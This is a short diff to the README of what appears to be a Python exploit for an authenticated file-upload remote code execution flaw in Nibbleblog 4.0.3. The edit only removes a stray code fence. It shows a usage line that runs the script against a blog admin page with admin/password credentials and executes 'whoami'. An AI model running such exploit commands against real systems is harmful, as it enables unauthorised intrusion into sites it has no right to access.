@@ -10,7 +10,6 @@ A python3 script for Nibbleblog 4.0.3 File Upload Authenticated Remote Code Exec
 
 ### Executing program
 
-```
 * RCE
 ```
 python3 nibbleblog_4.0.3.py -t http://nibblesrce.com/blog/admin.php -u admin -p password -rce whoami
